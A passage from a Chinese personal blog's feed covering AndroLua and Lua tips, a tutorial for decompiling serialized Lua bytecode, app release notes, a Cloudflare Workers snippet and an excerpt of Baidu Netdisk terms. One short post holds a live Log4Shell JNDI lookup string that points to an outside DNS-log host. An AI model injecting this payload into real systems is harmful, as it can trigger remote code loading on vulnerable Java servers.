    <content type="html"><![CDATA[<p>使用 Lua 的 string.dump(function [,strip]) 可以将一个函数序列化为二进制方式表示的字符串，如果　 strip 为真值， 二进制代码块不携带该函数的调试信息 （局部变量名、行号等等）。你可以使用 loadstring 函数重新调用该序列化后的代码块，但通常无法再获得完整的源代码。AndroLua 默认也是使用此种方式“加密”代码的</p><p>本文可以在纯安卓环境下反序列化 Lua 代码（也是对 AndroLua 应用的反编译）</p><p>需要先下载 <a href="http://ctpan.jiecs.top/f/32856022-532962471-147103">Lua 反序列化工具包</a>（包含 wine 运行环境，文件较大）</p><p>先安装工具包内的 ExaGear ED302_3.0.2.apk（ExaGear 能在安卓环境下运行 exe，需要存储权限）点击侧滑栏“环境管理”点击右上角的 + 新建一个环境（wine 环境）</p><p><img src="https://s4.ax1x.com/2022/01/04/TLrZQg.jpg" alt="新建环境"></p><p>使用文件管理器打开 &#x2F;sdcard（内部存储根目录）&#x2F;ExaGear&#x2F; 文件夹，将工具包内 ExaGear 文件夹中的全部内容复制过去</p><p><img src="https://s4.ax1x.com/2022/01/04/TLyVbj.jpg" alt="复制 LuaTool.exe 和文件夹"></p><p>然后将你需要反序列化的 lua 文件放到 src 文件夹下</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcEAs.jpg" alt="放 lua 文件"></p><p>本工具包已经内置了一个测试文件</p><p>返回 ExaGear 应用，启动刚才创建的环境</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcVNn.jpg" alt="启动环境"></p><p>等待环境启动，双击打开 LuaTool.exe</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcn3V.jpg" alt="运行 LuaTool.exe"></p><div class="note note-light">            <p>可以双指手势缩放</p>          </div><p>弹出一个批处理窗口后会闪退，是正常现象</p><p>查看 &#x2F;sdcard&#x2F;ExaGear&#x2F;dst&#x2F; 文件夹，已经创建了与 src 文件夹同名的一个操作码文件，此时已经可以看见部分代码内容</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcucT.jpg" alt="操作码文件"></p><p>现在安装工具包中的 TDecompile_1.3.apk（可以将操作码处理为可读的代码）点击右下角 + 选择文件</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcQuF.jpg" alt="选择文件"></p><p>选择刚才的操作码文件</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcKjU.jpg" alt="选择"></p><p>会提示“该脚本可能不是合法的的lua52脚本，是否继续？”点击“继续”即可</p><p><img src="https://s4.ax1x.com/2022/01/04/TLc1HJ.jpg" alt="提示对话框"></p><p>默认会选中全部指令，点击右下角“反编译”即可</p><p><img src="https://s4.ax1x.com/2022/01/04/TLc8E9.jpg" alt="反编译"></p><p>此时 &#x2F;sdcard&#x2F;ExaGear&#x2F;dst&#x2F; 文件夹下，可以看到 [反]test.lua 代码文件，已经基本可读</p><p><img src="https://s4.ax1x.com/2022/01/04/TLcGNR.jpg" alt="反序列化后的源代码"></p><p>通常除了局部变量名、Context以及注释，大部分代码都有着极高的可读性，基本可以直接运行。可读性与源代码相关，如果源代码使用了大量非 ASCII 变量、函数名、布局编写不规范等则可能需要一定程度的修复</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Android</tag>
      
      <tag>AndroLua</tag>
      
      <tag>Lua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Steam 被墙了</title>
    <link href="/archives/731/"/>
    <url>/archives/731/</url>
    
    <content type="html"><![CDATA[<p><a href="http://store.steampowered.com/">Steam</a> 被墙了。目前是 SNI 阻断 + DNS 污染（ERR_CONNECTION_RESET），不是最高级的阻断方式但也是相对高的了</p><p>2021.12.25 - 8时许</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java Log4j2</title>
    <link href="/archives/722/"/>
    <url>/archives/722/</url>
    
    <content type="html"><![CDATA[<p>${jndi:ldap:&#x2F;&#x2F;wy2gkk.dnslog.cn&#x2F;exp}</p><p>笑死，Wordpress 和 Java 有半毛钱关系</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓APP 2.0 发布</title>
    <link href="/archives/710/"/>
    <url>/archives/710/</url>
    
    <content type="html"><![CDATA[<p>杰出兽安卓APP 2.0 终于正式发布了，历经约 6,48~,~~~ 秒的开发，杰出兽安卓APP现以全新的面貌重新展现在大家面前</p><div class="note note-light">            <p>约 75 天</p>          </div><p>本次更新使用基于 AndroLua_pro 的 FusionApp 2.0完全重构所有代码。并结合我自己反编译操作 FusionApp 本体所带来的一些特性，带来了以下特别的内容更新</p><h2 id="完全支持-arm64-v8a（64-位）"><a href="#完全支持-arm64-v8a（64-位）" class="headerlink" title="完全支持 arm64-v8a（64 位）"></a>完全支持 arm64-v8a（64 位）</h2><p>随着 arm-v9 将至，最新的骁龙 8 Gen1 中 X2 超大核已停止对 armeabi-v7a（32位）的支持，并将在 2023 年完全停止支持运行 armeabi-v7 应用，我们也终于支持了 arm64-v8a。由于 FusionApp 至今仍不支持 arm64-v8a ，我将自行重新编译的支持 arm64-v8a 的 AndroLua lib 支持库自行反编译至于 FusionApp 内</p><h2 id="弃用腾讯-TBS（X5）浏览服务内核"><a href="#弃用腾讯-TBS（X5）浏览服务内核" class="headerlink" title="弃用腾讯 TBS（X5）浏览服务内核"></a>弃用腾讯 TBS（X5）浏览服务内核</h2><p>由于此前 FusionApp 1.0 时的自身缺陷，我不得不使用修改后的 X5 内核，而现在的 FusionApp 2.0 已没有必要使用 X5 内核了。我们现在使用 Android 自带的 WebView 内核，不仅有着强大的性能与安全性，还能极大的节约用户的存储空间，不必为复杂的兼容性等问题困扰</p><h2 id="网页中的“使用杰出兽安卓APP阅读”"><a href="#网页中的“使用杰出兽安卓APP阅读”" class="headerlink" title="网页中的“使用杰出兽安卓APP阅读”"></a>网页中的“使用杰出兽安卓APP阅读”</h2><p>现在在每篇文章最后的分享按钮处，你可以看到增加了一项“使用杰出兽安卓APP阅读”的选项。由于 FusionApp 2.0 并不支持更改 Manifest，我同样自行反编译应用文件。为了将 WelcomeActivity 的 Scheme 参数传递至 FusionActivity，我利用 Smali 反编译修改了 FusionApp 的 DEX 内容</p><h2 id="系统深色模式跟随支持"><a href="#系统深色模式跟随支持" class="headerlink" title="系统深色模式跟随支持"></a>系统深色模式跟随支持</h2><p>现在，当你打开系统的深色模式后打开应用，你会看到应用及内容网页完美的适配了深色模式。这受益于 FusionApp 2.0 强大的主题编辑功能，结合配置恰当的 MaterialColor 与规范的博客 MDx 主题等，实现了跟随系统设置的深色模式</p><h2 id="更多新-UI-与新功能"><a href="#更多新-UI-与新功能" class="headerlink" title="更多新 UI 与新功能"></a>更多新 UI 与新功能</h2><p>完全重写重构了旧有的全部代码，带来了全新布局样式 UI以及更多新功能。详情可以查看<a href="https://www.jiecs.top/archives/695">之前的预览</a>（预览图片与当前实际内容略有差别）</p><h2 id="如何下载更新"><a href="#如何下载更新" class="headerlink" title="如何下载更新"></a>如何下载更新</h2><p>直接使用 1.0 的应用内更新即可直接下载，或点击<a href="https://www.jiecs.top/app">此处</a></p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Android</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使你的Web站点全局变成黑白</title>
    <link href="/archives/701/"/>
    <url>/archives/701/</url>
    
    <content type="html"><![CDATA[<p>CSS样式代码：</p><p>html {<br>    filter: grayscale(100%);<br>}</p><p>加上 &lt;style&lt;!–swig￼1–&gt;<br>Wordpress 等可以直接使用主题中的页头脚本等功能（就是你放统计代码的地方）快速应用到整个站点</p><p><img src="https://s4.ax1x.com/2021/12/13/oLWfAK.jpg" alt="主题中设置页头脚本"></p><p>如果你需要在部分地方灵活应用黑白状态的话可以使用 Javascript 注入脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;html&quot;</span>)\[<span class="hljs-number">0</span>\].<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&quot;style&quot;</span>,<span class="hljs-string">&quot;filter:grayscale(100%);&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>程序</tag>
      
      <tag>JavaScript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓APP 2.0 预览</title>
    <link href="/archives/695/"/>
    <url>/archives/695/</url>
    
    <content type="html"><![CDATA[<p>关于杰出兽安卓APP 2.0</p><p>目前大多数内容都快写完了，以下是一些预览。不代表开发最终结果</p><p>首页文章列表等：</p><p><img src="https://z3.ax1x.com/2021/11/26/oV6zw9.jpg" alt="首页文章列表"></p><p>菜单页：</p><p><img src="https://z3.ax1x.com/2021/11/26/oV6XyF.jpg" alt="菜单页"></p><p><img src="https://z3.ax1x.com/2021/11/26/oV6OQU.jpg"></p><p>关于页：</p><p><img src="https://z3.ax1x.com/2021/11/26/oV6bWV.jpg" alt="菜单页 - 检查应用更新设置对话框"></p><p>快开发完毕的功能：</p><p><img src="https://z3.ax1x.com/2021/11/26/oV6HJ0.jpg" alt="关于页"></p><p><img src="https://z3.ax1x.com/2021/11/26/oV6qzT.jpg" alt="网络热词查询"></p><p><img src="https://z3.ax1x.com/2021/11/26/oV67iq.jpg" alt="随便看看（一言瀑布流）"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Android</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用 CloudflareWorkers 搭建简易一言服务</title>
    <link href="/archives/686/"/>
    <url>/archives/686/</url>
    
    <content type="html"><![CDATA[<p><a href="https://workers.cloudflare.com/">CloudflareWorkers</a> 是Cloudflare 推出的一项无服务器代码运行服务，国内一般叫边缘计算、云函数之类的。</p><p>CloudflareWorkers 主要支持 JavaScript、Rust、C、C++（泛指）可以部署一些简单的服务。官方给出的应用场景有根据用户 Header 自动修改域名（<strong>cn</strong>.google.com）、控制对于不同请求的不同 Cloudflare 配置之类的</p><p>CloudflareWorkers 每天的前 10 万个请求是免费的，完全够一般使用了，而且部署速度什么的也很快，用在一些简单的服务非常方便</p><p>搭建一言服务的话我的思路是用 CloudflarePages 之类的静态托管服务，以 JSON 保存下所有的一言内容。然后 CloudflareWorkers 监听到 HTTP 请求后从 Pages 获取所有的一言内容，解析 JSON 为 JavaScript 对象，随机选择并输出</p><p>其实 CloudflareWorkers 还有一个叫 WorkersKV 的东西，可以在 Workers 做永久存储。但考虑到以后想添加一言内容可能不是很方便，还是把所有的一言内容托管到 CloudflarePages 吧</p><p>CloudflareWorkers 有一个在线 IDE，操作很方便。以下是代码，只用把新创建 Workers 自带的代码全换成这个就行了</p><div class="note note-light">            <p>怎么创建项目之类的问题自己百度</p>          </div><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;fetch&quot;</span>, (event) =&#123;% note light %&#125;<br>&#123;<br><br>&#123;% endnote %&#125;  event.<span class="hljs-title function_">respondWith</span>(<br>    <span class="hljs-title function_">handleRequest</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">catch</span>(<br>      (err) =&#123;% note light %&#125;<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(err.<span class="hljs-property">stack</span>, &#123; <span class="hljs-attr">status</span>: <span class="hljs-number">500</span> &#125;)<br><br>&#123;% endnote %&#125;    )<br>  );<br>&#125;);<br><br><br>/\*\*<br> \* <span class="hljs-title class_">Example</span> someHost is set up to take <span class="hljs-keyword">in</span> a <span class="hljs-title class_">JSON</span> request<br> \* <span class="hljs-title class_">Replace</span> url <span class="hljs-keyword">with</span> the host you wish to send requests to<br> \* @param &#123;string&#125; someHost the host to send the request to<br> \* @param &#123;string&#125; url the <span class="hljs-variable constant_">URL</span> to send the request to<br> \*/<br><br><span class="hljs-keyword">const</span> url = <span class="hljs-string">&quot;https://xx.pages.dev/yiyan.json&quot;</span><br><span class="hljs-comment">// 这里是你的所有的一言内容 JSON 网页链接 ^</span><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getHitokoto</span>(<span class="hljs-params">response</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; headers &#125; = response<br>  <span class="hljs-keyword">const</span> contentType = headers.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;content-type&quot;</span>)  <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-keyword">if</span> (contentType.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;application/json&quot;</span>)) &#123;<br>    <span class="hljs-keyword">var</span> web=response.<span class="hljs-title function_">text</span>()<br>    <span class="hljs-keyword">var</span> json = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-keyword">await</span> web)<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(json\[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()\*(json.<span class="hljs-property">length</span>-<span class="hljs-number">0</span>+<span class="hljs-number">1</span>)+<span class="hljs-number">0</span>)\])<br>    <span class="hljs-comment">// 主要代码就只有上面这行 ^</span><br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRequest</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> init = &#123;<br>    <span class="hljs-attr">headers</span>: &#123;<br>      <span class="hljs-string">&quot;content-type&quot;</span>: <span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>,<br>    &#125;,<br>  &#125;<br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, init)<br>  <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getHitokoto</span>(response)<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(results, init)<br>&#125;<br><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;fetch&quot;</span>, event =&#123;% note light %&#125;<br>&#123;<br><br>&#123;% endnote %&#125;  <span class="hljs-keyword">return</span> event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>())<br>&#125;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>程序</tag>
      
      <tag>Cloudflare</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于在 FusionApp 上使用 WebViewClient 对 WebView 的加载监听的具体操作</title>
    <link href="/archives/680/"/>
    <url>/archives/680/</url>
    
    <content type="html"><![CDATA[<p>WebView 可以使用 WebViewClient 方法对页面即将加载、加载完成、遇到各种错误等情况做监听。但在 FusionApp 或相关 AndroLua IDE 上，无法直接监听</p><p>此处 FusionApp 版本为 2.0-beta8.7.2</p><p>主要是需要使用 luajava.override 方法对 WebViewClient 做转接层，具体代码实现如下</p><p>import “android.webkit.WebViewClient”<br>–需要先使用 UiManager 获取 webView 的控件 ID，以下控件 ID 即为“webView”</p><p>webView.setWebViewClient(luajava.override(WebViewClient,{<br>  onReceivedError&#x3D;function(a,view, webResourceRequest,webResourceError)<br>    –连接错误事件</p><p>  end,<br>  onReceivedHttpError&#x3D;function(a,view, webResourceRequest,webResourceError)<br>    –HTTP错误事件</p><p>  end,<br>  onReceivedSslError&#x3D;function(a,view,sslErrorHandler,sslError)<br>    –SSL错误事件</p><p>  end,<br>  onPageFinished&#x3D;function(a,view,url)<br>    –页面加载结束事件</p><p>  end,<br>  shouldOverrideUrlLoading&#x3D;function(a,view,webResourceRequest)<br>    –页面即将加载事件</p><pre><code class="hljs">return false</code></pre><p>  end,<br>  onPageStarted&#x3D;function(a,view,url,favicon)<br>    –页面开始加载事件</p><p>  end,<br>}))</p><p>有几点需要注意：</p><ol><li>可以根据自己的使用需求添加监听事件，还能添加如资源加载、页面渲染等事件</li><li>onReceivedError、shouldOverrideUrlLoading 等事件返回的 webResourceRequest 可以获取该请求信息。如 onReceivedError 中可以使用 webResourceRequest.getUrl() 获取URL链接，需要注意的是，这里是不是当前 webView 的URL，而是“错误的URL”例如页面中的一张图片加载错误则返回错误的图片链接</li><li>onReceivedError 等事件返回的 webResourceError 可以获取该请求的错误信息。如使用 webResourceError.getErrorCode() 获取错误码，错误码与 WebViewClient 的常量值对应。onReceivedSslError 中应使用 sslError.getPrimaryError() 获取 SSL 错误原因</li><li>页面上的任何错误事件都会返回 onReceivedError 和相关事件，如果你要对错误事件做处理需要先用上文方法获取错误的链接进行匹配。否则即使页面中的任意一张小图片发生错误，甚至 GoogleAnalytics 等加载失败，都会报错</li><li>shouldOverrideUrlLoading 即将加载事件可以通过返回 true 来阻止本次加载 retrue true</li><li>使用 luajava.override 进行转接，每个返回值前方会返回一个父 class 的信息，即上代码中的“a”如不需要可以使用下划线虚变量</li></ol>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AndroLua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lua 控件透明度动画效果</title>
    <link href="/archives/668/"/>
    <url>/archives/668/</url>
    
    <content type="html"><![CDATA[<p>AndroLua 很实用的代码，打包成了函数。可以用在 FusionApp 等 AndroLuaIDE 上</p><p>输入控件ID、动画时间、开关状态即可</p><p>开关状态为 true 即隐藏，为 nil 或 false 则为显示</p><p>例如 alpha(button,250,true) 就是将控件 ID 为 button 的控件通过 250 毫秒的透明度动画隐藏</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-string">&quot;android.animation.ObjectAnimator&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alpha</span><span class="hljs-params">(id,time,i)</span></span><br>  <span class="hljs-comment">--透明度动画</span><br>  <span class="hljs-keyword">if</span> i <span class="hljs-keyword">then</span> on,off,hide=<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span> <span class="hljs-keyword">else</span> on,off,hide=<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span> <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">if</span> id.visibility~=hide <span class="hljs-keyword">then</span><br>    id.visibility=<span class="hljs-number">0</span><br>    animation = ObjectAnimator.ofFloat(id, <span class="hljs-string">&quot;alpha&quot;</span>, &#123;on, off&#125;)<br>    animation.setDuration(tointeger(<span class="hljs-built_in">time</span>))<br>    animation.start()<br>    task(tointeger(<span class="hljs-built_in">time</span>),<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><br>      id.visibility=hide<br>    <span class="hljs-keyword">end</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Android</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓 APP 2.0</title>
    <link href="/archives/651/"/>
    <url>/archives/651/</url>
    
    <content type="html"><![CDATA[<p>关于 杰出兽安卓 APP 2.0</p><p>将<br>使用 FusionApp 2.0 编写<br>重写 99% 的代码布局<br>使应用更加不像网页套壳<br>使主要功能特点与 1.0 相近<br>优化代码配置存储解析方式（json）<br>重写远程更新更新、远程代码功能</p><p>也许<br>不再会使用 TBS X5 内核<br>会删除之前的几个功能</p><p>可能<br>会添加新功能</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽安卓 APP</title>
    <link href="/archives/649/"/>
    <url>/archives/649/</url>
    
    <content type="html"><![CDATA[<p>杰出兽安卓 APP 2.0 已经在做了</p><p>新建了一个工程捏！</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>AndroLua</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>闲的蛋疼</title>
    <link href="/archives/609/"/>
    <url>/archives/609/</url>
    
    <content type="html"><![CDATA[<p>总感觉前几个月还是中秋+国庆小长假，马上又是国庆了</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>头条极速版shortcuts</title>
    <link href="/archives/604/"/>
    <url>/archives/604/</url>
    
    <content type="html"><![CDATA[<p>今日头条极速版的 shortcuts 有一个“存储空间不足怎么办”</p><p>我以为是什么清理软件推广，没想到不是</p><p>怕你看广告不小心装一堆应用没空间了？</p><p><img src="https://z3.ax1x.com/2021/09/21/4JXRJ0.jpg" alt="清理存储空间"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>字节跳动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>两种看上去很低创实际上也很低创视频制作步骤</title>
    <link href="/archives/601/"/>
    <url>/archives/601/</url>
    
    <content type="html"><![CDATA[<p>左上角三横杠可进入文章目录跳转至你需要的部分</p><h2 id="摸摸-XXX"><a href="#摸摸-XXX" class="headerlink" title="摸摸 XXX"></a>摸摸 XXX</h2><p><img src="https://z3.ax1x.com/2021/09/20/4Jmyr9.png" alt="摸摸金凡"></p><ol><li>生成 GIF 图，可细调：<a href="https://benisland.neocities.org/petpet">在线链接</a></li><li>BGM EndingTheme-近藤浩治：<a href="http://ctpan.jiecs.top/f/32856022-514273873-9984d0">MP3 下载</a></li><li>前面的内容参考<a href="https://b23.tv/av889957215">我的视频</a>，手的素材可以直接截图或者百度一张，图片设置位置移动关键帧，加上 BGM，最后拓展内容随便搞点</li></ol><p>看你拓展内容怎样，还有反应快不快。假如一个新梗出来别人已经做出了你再做就没有意义</p><h2 id="钢琴幻听人声"><a href="#钢琴幻听人声" class="headerlink" title="钢琴幻听人声"></a>钢琴幻听人声</h2><p>giegie</p><ol><li>将 MP3、WAV 音频等转换为 MIDI 乐谱文件：<a href="https://www.bearaudiotool.com/zh/mp3-to-midi">在线链接</a></li><li>MIDI 可视化直接使用 FL Studio，或者 Win 的 Synthesia(随便百度一个)；安卓的完美钢琴(各大应用商店)。录屏就行</li><li>加上字幕，稍微修下录屏</li></ol>]]></content>
    
    
    <categories>
      
      <category>简单教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
      <tag>教程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lua 格式化 URL 链接</title>
    <link href="/archives/595/"/>
    <url>/archives/595/</url>
    
    <content type="html"><![CDATA[<p>代码：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">urlFormat</span><span class="hljs-params">(url)</span></span><br> url=<span class="hljs-built_in">tostring</span>(url)<br> <span class="hljs-keyword">if</span> <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(url,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>)==<span class="hljs-string">&#x27;http://&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">tostring</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(url,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>))==<span class="hljs-string">&#x27;https://&#x27;</span> <span class="hljs-keyword">then</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(url,#url,#url+<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">then</span><br>   urln=<span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(url,<span class="hljs-number">0</span>,#url<span class="hljs-number">-1</span>)<br>   <span class="hljs-keyword">else</span><br>   urln=url<br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">else</span><br>  urln=<span class="hljs-string">&#x27;http://&#x27;</span>..url<br> <span class="hljs-keyword">end</span><br> <span class="hljs-keyword">return</span> urln<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">--使用示例</span><br><span class="hljs-built_in">print</span>(urlFormat(<span class="hljs-string">&#x27;jiecs.top/&#x27;</span>))<br><br><span class="hljs-comment">--输出 http://jiecs.top</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
      <tag>Lua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>百度网盘 服务条款 / 隐私政策</title>
    <link href="/archives/554/"/>
    <url>/archives/554/</url>
    
    <content type="html"><![CDATA[<p>以下是百度网盘 服务条款、隐私政策 部分摘录<br>加粗为重点 …为省略</p><h2 id="服务条款"><a href="#服务条款" class="headerlink" title="服务条款"></a>服务条款</h2><p>…</p><p>1.5 根据用户使用百度网盘的情况，度友公司将不断改善产品体验，例如<strong>提供个性化的服务或提高用户使用服务的安全性</strong>。同时，如经由通知、举报等 途径发现用户在使用百度网盘服务所提供的网络服务时违反任何本协议的规定，度友公司有权要求用户改正或直接采取一切度友公司认为必要的措施（<strong>包括但不限于更改或删除用户上载的内容、暂停或终止用户使用网络服务，和&#x2F;或公示违法或违反本协议约定使用百度网盘服务用户账户的权利</strong>）以减轻用户不当行为造成的影响。</p><p>…</p><p>2.2 **百度网盘帐号的所有权归度友公司所有，用户完成申请注册手续后，仅获得百度网盘帐号的使用权，且该使用权仅属于初始申请注册人。**同时，初始申请注册人不得赠与、借用、租用、转让或售卖百度网盘帐号或者以其他方式许可非初始申请注册人使用百度网盘帐号。非初始申请注册人不得通过受赠、继承、承租、受让或者其他任何方式使用百度网盘帐号。</p><p>…</p><p>5.3 度友公司不会<strong>公开或向第三方提供用户存储在百度网盘服务上的非公开内容，除非有下列情况</strong>：<br>5.3.1 经用户同意；<br>5.3.2 有关法律、法规规定或百度网盘服务合法服务程序规定；<br>5.3.3 <strong>在紧急情况下，为维护用户及公众的权益</strong>；<br>5.3.4 <strong>其他</strong>依法需要公开、编辑或透露个人信息的情况。</p><p>…</p><p>6.1 鉴于网络服务的特殊性，用户同意百度网盘服务<strong>有权随时变更、中断或终止部分或全部 的网络服务</strong>。如变更、中断或终止的网络服务属于免费网络服务，<strong>百度网盘服务无需通知用户，也无需对任何用户或任何第三方承担任何责任</strong>。</p><p>…</p><p>6.3 